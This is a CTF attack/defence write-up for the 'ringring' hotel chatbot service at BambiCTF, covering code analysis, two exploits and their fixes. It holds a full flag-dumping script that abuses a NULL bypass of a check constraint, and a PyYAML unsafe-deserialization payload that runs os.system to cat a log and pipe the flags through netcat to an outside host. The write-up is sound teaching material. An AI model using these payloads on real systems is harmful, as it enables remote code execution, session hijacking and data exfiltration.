# ringring - BambiCTF A/D

## Basic understanding
This service is divided in 4 different parts:
- App: is a Flask web application publicly available on port 7353. The home page provides us with a simple chatbot which can help us to set alarms, order food and pay our invoices. This application models a virtual hotel.
- InvoiceApp: is another Flask web application which can't be directly used via browser cause it has no port mapping outside its docker container. It models the `invoice backend`, because it is used by the first application to process invoices.
- Postgres: a postgres database with two tables:
```sql
CREATE TABLE IF NOT EXISTS ringring.alarms
(
    session_id text,
    alarm_time text,
    alarm_text text
);
```
```sql
CREATE TABLE IF NOT EXISTS ringring.sessions
(
    session_id text,
    started     timestamptz DEFAULT now(),
    is_billable boolean CHECK ( is_billable != is_vip ) DEFAULT TRUE,
    is_vip     boolean DEFAULT FALSE
);
```
  this database is used to hold the first application data.
- InvoicePostgres: a postgres database with one table:
```sql
CREATE TABLE IF NOT EXISTS invoices.invoices
(
    invoice_number text,
    item text,
    name text,
    time timestamptz,
    amount numeric,
    note text,
    paid boolean
);
```

## First exploit
During the first rounds we attempted to catch our own flags in order to understand what the bot does in order to place them. We reached the first bucket: the alarms table. The game bot accesses the home page and uses the chatbot to add an alarm, the flag is posted as an alarm message so it is placed in the `alarm_text` table field.

We started to look through the code: an alarm is set using the bot, the bot uses the `/get_bot_response` to implement its logic.
```python
@app.route('/get_bot_response')
def get_bot_response():
    """
    Main Endpoint for chat bot communication. Handles the user input and calls respective methods.
    The state and mode parameters are used to track the current status between the front end and the back end.
    :return:
    """
    user_text = request.args.get('msg')
    state = request.args.get('state')
    if state:
        state = json.loads(state)
    else:
        state = {'mode': 'main_menu'}

    if (state and state['mode'] == 'alarm') or (re.search('alarm', user_text)):
        return set_alarm(user_text, state)

    elif re.search('lonely|bored', user_text):
        return {'response': 'Go to /guests to see how other guests are doing.'}

    elif re.search('food', user_text) or (state and state['mode'] == 'food_order'):
        return order_food(user_text, state)

    elif (state and state['mode'] == 'invoice') or (re.search('pay', user_text)):
        return make_invoice(user_text, state)

    elif (state and state['mode'] == 'invoice_info') or re.search('invoice info', user_text):
        return get_invoice_info(user_text, state)
```

Deeply reading the bot code we reached more endpoints such as: `/guests`.
```python
@app.route('/guests', methods=['GET'])
def guests():
    """
    Overview over all non_vip guests.
    :return:
    """

    class ItemTable(Table):
        guest_id = Col('Guest ID')

    items = db_helper.get_paying_sessions()
    table = ItemTable(items)

    return render_template('service.html',
                           service_description='If you are bored, then go and visists some of our other guests.',
                           table=table)
```

This endpoint calls the `get_paying_sessions()` utility function:
```python
def get_paying_sessions():
    conn = psycopg2.connect(CONNECTION_STRING)
    cur = conn.cursor()
    query = sql.SQL("""
    SELECT * FROM ringring.sessions WHERE session_id NOT IN
        (SELECT session_id FROM ringring.sessions WHERE NOT is_billable AND is_vip)
        ORDER BY started DESC
        LIMIT 1000;
    """)
    cur.execute(query)
    data = [{'guest_id': row[0]} for row in cur.fetchall()]
    conn.commit()
    conn.close()

    return data
```

which gives us the `session_ids` of the users where the condition `NOT is_billable AND is_vip` is false, we can use the session_id to hijack the sessions and retrieve the alarms via the `/alarm` endpoint!

```python
@app.route('/alarm', methods=['GET'])
def alarm():
    """
    Overview over all alarms for a specific session_id
    :return:
    """

    class ItemTable(Table):
        time = Col('time')
        text = Col('text')

    # TODO: add alarm overview page (potentially just a dead end)
    items = db_helper.get_alarms(request.cookies.get('session_id'))
    table = ItemTable(items)

    return render_template('service.html', service_description='These are your alarms.', table=table)
```

But we are not so lucky, as the bot does something more to avoid his session_id to become public because no hijacked session from `/guests` leads us to flag dump.

Going on with the code analysis we found the hidden endpoint `/make_me_a_vip`:
```python
@app.route('/make_me_a_vip', methods=['POST'])
def make_me_a_vip():
    """
    Endpoint to make a specific session vip.
    The recalc parameter can be used to change the database restrictions on whether a vip can be billable or not.
    :return:
    """
    session_id = request.cookies.get('session_id')
    check_session_id(session_id)

    db_helper.make_vip(session_id)

    recalc = request.form.get('recalc')
    if recalc:
        try:
            vips_are_billable = ast.literal_eval(recalc)
        except ValueError:
            return {'response': 'recalc must be either True or False'}
        if db_helper.update_invoicing(vips_are_billable):
            return {'success': True}
        else:
            return {'success': False}, 400
    else:
        return {'success': True}
```

which uses the utility functions `make_vip` abd `update_invoicing`:
```python
def make_vip(session_id):
    conn = psycopg2.connect(CONNECTION_STRING)
    cur = conn.cursor()
    query = """
    DELETE FROM ringring.sessions WHERE session_id = (%s);
    INSERT INTO ringring.sessions (session_id, is_billable, is_vip) VALUES (%s, %s, %s);
    """
    cur.execute(query, [session_id, session_id, False, True])
    conn.commit()
    conn.close()
```

```python
def update_invoicing(vips_are_billable=False):
    conn = psycopg2.connect(CONNECTION_STRING)
    cur = conn.cursor()
    try:
        query = sql.SQL("""
        UPDATE ringring.sessions SET is_billable = (%s) WHERE is_vip = TRUE;
        """)
        cur.execute(query, [vips_are_billable])
    except (psycopg2.ProgrammingError, psycopg2.errors.CheckViolation):
        conn.rollback()
        return False
    conn.commit()
    conn.close()
    return True
```

Calling this endpoint the bot marks his session as vip and not billable, in this way the server doesn't print it. The `make_me_a_vip` endpoint does more than that, though!
If we pass the `recalc` parameter its value is passed to `update_invoicing` function and used to perform the update query over all the vips sessions. We could pass `That` so that the accounts become billable and printable by the application. When we attempt to do that the database throws an error because the `is_billable` row in the database table has a check constraint:
```sql
is_billable boolean CHECK ( is_billable != is_vip ) DEFAULT TRUE,
```
we can't set `is_billable` to True while `is_vip` is True too because the check fails and so the query.

A solution to this problem is the `NULL` value: since the row hasn't the `NOT NULL` constraint set, we can use it as a third value. We need to pass `None` via the recalc parameter and we can now dump all the sessions, even the vip ones!

Our first exploit is:
```python
import requests
import re
import sys
import threading

IP = sys.argv[1]
base_url = f'http://{IP}:7353/'
session_regex = '<tr><td>(.*)</td></tr>'
flag_regex = 'ENO[A-Za-z0-9+\/=]{48}'


def nuda_tutto_quanto():
    s = requests.Session()
    r = s.get(f'{base_url}')

    form = {
        'recalc' : 'None'
    }

    r = s.post(f'{base_url}/make_me_a_vip', data = form)


def get_sessions():
    r = requests.get(f'{base_url}/guests')
    r = r.text

    sessions = re.findall(session_regex, r)

    return sessions


def dump_alarms(session):
    cookies = {
        'session_id' : session
    }

    r = requests.get(f'{base_url}/alarm', cookies = cookies)
    r = r.text

    flags = re.findall(flag_regex, r)

    if len(flags) > 0:
        for f in flags:
            print(f, flush=True)


def main():
    nuda_tutto_quanto()
    s = get_sessions()

    for t in s:
        dump_alarms(t)


if __name__ == '__main__':
    main()
```

## First fix
To avoid this exploit we can do basically two things:
- Update the table adding the `NOT NULL` constraint
- Checking the `recalc` parameter to avoid the `None` value


## Second exploit
The second flag bucket was located into the invoices database, so it is managed by the InvoiceApp application. We started analyzing the bridge between the two applications but we found nothing important. The only thing that caught our attention was, once again, the chatbot funcionalities: we can ask for invoice information if we are logged and we know the invoice number. So we can bruteforce them, but it is not really feasible. We tried to find a way to dump the invoice numbers but we achieved nothing.

Going up and down on the app code we noticed something very weird:
```python
@app.route('/add', methods=['POST'])
def add_to_bill():
    """
    Endpoint to add an item to the invoice. Adds it both to the db as well as to the logfile.

    :return:
    """
    guest_name = request.form.get('name')
    if not guest_name:
        return param_error('name')

    invoice_item = request.form.get('item')
    if not invoice_item:
        return param_error('item')

    payment_type = request.form.get('payment-type', PAYMENT_ON_ACCOUNT)
    note = request.form.get('note', '')

    if not validate_invoice(guest_name, invoice_item):
        logger.warning(
            f"Aborting invoice accounting - invoice parameters guest name '{guest_name}' and item '{invoice_item}' are not valid (HTTP 404).")
        return jsonify(success=False), 400

    amount = get_price(invoice_item)
    invoice_number = get_invoice_number()
    invoice = {
        'invoice_number': invoice_number,
        'item': invoice_item,
        'guest_name': guest_name,
        'amount': amount,
        'note': note
    }
    controller = get_invoice_controller(payment_type=payment_type)
    controller.account(f'invoice #{invoice_number} accounted', extra=invoice)
    if payment_type == PAYMENT_SETTLED:
        paid = True
    else:
        paid = False

    invoice_db_helper.insert_invoice(invoice_number, invoice_item, guest_name, datetime.datetime.now(), amount, note,
                                     paid)
    return jsonify(success=True, invoice_number=invoice_number)
```

in the `add` endpoint the user provides `payment_type` and it is passed to the `get_invoice_controller` function.

```python
def get_invoice_controller(payment_type=PAYMENT_ON_ACCOUNT, log_level='ACCOUNT'):
    """
    Helper function to return the correct logger.
    :param payment_type:
    :param log_level:
    :return:
    """
    with open('logger-config.yml', 'r') as yaml_file:
        config = yaml_file.read().format(payment_type=payment_type, level=log_level)
        config = yaml.load(config, Loader=yaml.Loader)
        logging.addLevelName(ACCOUNT, 'ACCOUNT')
        logging.config.dictConfig(config)
        logging.Logger.account = account
        logger = logging.getLogger('invoice_controller')
        # logger.debug('invoice-controller logger started.')
    return logger
```

this functions reads `logger-config.yml` and uses it as a template string in order to build a valid yaml. This yaml is then loaded with `yaml.load` using the `yaml.Loader` loader. Then this object is used to build the logger object and return it to the caller.

Browsing the yaml library on the internet we found a few articles talking about an `insecure deserialization` flaw in this library. We then copied this code and made some tests. In the end we achieved `arbitrary code execution` on our local machine.

Now comes the hard part: 40 minutes left and no idea on how to build the exploit. No database dump was achievable since it was in another container... Looking at the file tree we noticed the `accounting` directory, inside it there were two files:
- outstangind-invoices.log
- settled-invoices.log
The first one contains the flags! We built a fast PoC and we dumped the file to a listening netcat connection, it worked! No one else dumped this second bucket until that point, so we redirected the exploit to another team and we submitted the flag to our flag submitter and... `saarsec` first blood announced, _wtf dudes_!!

With a bit of regret we built a better exploit:
- Run socat as a repeater on our server in order to redirect all our inbound requests to the game server
- Inject the yaml and execute a bash command to dump the file, collect the flag one per line and send them via netcat to our socat repeater
- ???
- Profit

```python
import requests
import re
import sys

IP = sys.argv[1]
base_url = f'http://{IP}:7353/'

flag_regex = 'ENO[A-Za-z0-9+\/=]{48}'

payment_type = """
        !!map {
            ? !!str "cash"
            : !!python/objet/apply:os.system [
                !!str "cat accounting/outstanding-invoices.log | egrep -o 'ENO[A-Za-z0-9+\/=]{48}' | nc <ip> <port> -q 10"
            ],
        }
"""

def register(s):
    s.get(base_url)


def add_item(s):
    url = base_url + '/get_bot_response?msg=asd&state={"mode": "alarm", "alarm_time": "12:12"}'
    r = s.get(url)


def inject_payload(s):
    url = base_url + '/get_bot_response?msg=' + payment_type + '&state={"mode": "alarm", "payment": "pending"}'
    r = s.get(url)
    print(r.text)


def main():
    s = requests.Session()
    register(s)
    add_item(s)
    inject_payload(s)

if __name__ == '__main__':
    main()
```

## Second fix
The fastest fix we can do is to avoid the use of the basic yaml Loader and switch to the safe one:
```python
config = yaml.load(config, Loader=yaml.SafeLoader)
```